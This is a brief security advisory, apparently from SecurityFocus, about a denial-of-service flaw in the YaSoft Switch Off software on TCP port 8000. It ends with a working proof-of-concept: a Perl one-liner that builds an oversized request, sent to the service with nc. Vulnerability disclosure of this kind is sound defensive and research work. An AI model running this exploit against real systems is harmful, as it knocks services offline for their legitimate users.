source: https://www.securityfocus.com/bid/9339/info

A problem has been identified in the YaSoft Switch Off software package when handling large packets via the service management port (8000/TCP). This may make it possible for a remote user to deny service to legitimate users of the service. 

perl -e "print 'a'x10240 . chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a);" > DoS.txt

nc 127.0.0.1 8000 < DoS.txt